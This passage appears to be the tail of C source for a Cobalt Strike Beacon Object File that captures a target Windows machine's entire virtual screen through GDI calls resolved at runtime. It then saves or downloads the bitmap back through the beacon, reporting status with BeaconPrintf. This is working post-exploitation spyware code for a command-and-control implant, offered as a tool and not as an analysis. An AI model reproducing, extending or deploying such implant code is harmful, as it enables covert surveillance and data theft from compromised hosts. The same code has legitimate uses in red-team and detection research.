        int y1 = pGetSystemMetrics(SM_YVIRTUALSCREEN);
        int w = pGetSystemMetrics(SM_CXVIRTUALSCREEN);
        int h = pGetSystemMetrics(SM_CYVIRTUALSCREEN);
        HDC hScreen = pGetDC(NULL);
        HDC hDC = pCreateCompatibleDC(hScreen);
        hBitmap = pCreateCompatibleBitmap(hScreen, w, h);
        if (!hBitmap) {
            BeaconPrintf(CALLBACK_ERROR, "[DEBUG] Failed to create full screen bitmap");
            pReleaseDC(NULL, hScreen);
            pDeleteDC(hDC);
            return;
        }
        HGDIOBJ old_obj = pSelectObject(hDC, hBitmap);
        if (!pBitBlt(hDC, 0, 0, w, h, hScreen, x1, y1, SRCCOPY))
            BeaconPrintf(CALLBACK_ERROR, "[DEBUG] BitBlt failed for full screen capture");
        pSelectObject(hDC, old_obj);
        pDeleteDC(hDC);
        pReleaseDC(NULL, hScreen);
    }

    if (hBitmap) {
        if (debug)
            BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] Captured bitmap successfully; saving/downloading as %s", filename);
        if (!SaveHBITMAPToFile(hBitmap, filename, savemethod))
            BeaconPrintf(CALLBACK_ERROR, "[DEBUG] Failed to save bitmap");
        else
            BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] Screenshot saved/downloaded as %s", filename);
        pDeleteObject(hBitmap);
    }
}
#else
void main(int argc, char* argv[])
{
    /* Non-BOF main() implementation (if needed) */
}
#endif
